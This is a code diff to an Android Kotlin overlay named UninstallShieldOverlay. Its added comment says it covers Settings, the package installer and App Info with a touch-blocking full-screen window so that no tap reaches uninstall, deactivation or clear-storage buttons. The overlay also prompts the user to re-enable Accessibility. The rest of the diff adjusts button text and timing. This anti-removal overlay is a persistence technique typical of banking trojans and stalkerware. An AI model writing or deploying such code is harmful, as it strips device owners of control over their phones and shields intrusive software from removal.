@@ -20,13 +20,23 @@ import android.widget.FrameLayout
 import android.widget.LinearLayout
 import android.widget.TextView
 
+/**
+ * Full-screen, touch-blocking hardware overlay displayed over Settings, PackageInstaller,
+ * and App Info while Accessibility is temporarily disabled for Banking apps.
+ *
+ * Strictly without FLAG_NOT_TOUCHABLE or FLAG_NOT_FOCUSABLE so that zero taps can reach
+ * any uninstall, deactivation, or clear storage button underneath.
+ */
 object UninstallShieldOverlay {
     private const val TAG = "UninstallShieldOverlay"
     private val mainHandler = Handler(Looper.getMainLooper())
     private var windowManager: WindowManager? = null
     private var overlayView: View? = null
+
     @Volatile var isShowing = false
         private set
+
+    @Volatile var hasRequestedHomeReturn = false
 
     fun show(context: Context) {
         val appCtx = context.applicationContext
@@ -45,6 +55,7 @@ object UninstallShieldOverlay {
                 val wm = (appCtx.getSystemService(Context.WINDOW_SERVICE) as? WindowManager) ?: return@post
                 windowManager = wm
 
+                hasRequestedHomeReturn = false
                 val view = createOverlayView(appCtx)
                 overlayView = view
 
@@ -95,6 +106,7 @@ object UninstallShieldOverlay {
                 isShowing = false
                 overlayView = null
                 windowManager = null
+                hasRequestedHomeReturn = false
             }
         }
     }
@@ -103,7 +115,7 @@ object UninstallShieldOverlay {
         runCatching {
             val homeIntent = Intent(Intent.ACTION_MAIN).apply {
                 addCategory(Intent.CATEGORY_HOME)
-                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED
+                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
             }
             context.startActivity(homeIntent)
         }
@@ -170,10 +182,11 @@ object UninstallShieldOverlay {
         }
         cardLayout.addView(msgView)
 
-        // Button 1: Re-enable Accessibility
+        // Button 1: Re-enable Accessibility (Single line 3D button)
         val btnReEnable = Button(context).apply {
             text = "Re-enable Accessibility"
             isSingleLine = true
+            maxLines = 1
             textSize = 12.5f
             setTextColor(Color.WHITE)
             paint.isFakeBoldText = true
@@ -197,10 +210,11 @@ object UninstallShieldOverlay {
         }
         cardLayout.addView(btnReEnable, btnParams1)
 
-        // Button 2: Go to Home Screen
+        // Button 2: Return to Home (Single line 3D button)
         val btnHome = Button(context).apply {
-            text = "Go to Home Screen"
+            text = "Return to Home"
             isSingleLine = true
+            maxLines = 1
             textSize = 12.5f
             setTextColor(Color.parseColor("#E9D5FF"))
             paint.isFakeBoldText = true
@@ -213,8 +227,11 @@ object UninstallShieldOverlay {
             val pV = dp(context, 10)
             setPadding(dp(context, 14), pV, dp(context, 14), pV)
             setOnClickListener {
+                hasRequestedHomeReturn = true
                 sendHome(context)
-                hide()
+                mainHandler.postDelayed({
+                    hide()
+                }, 350L)
             }
         }
         val btnParams2 = LinearLayout.LayoutParams(
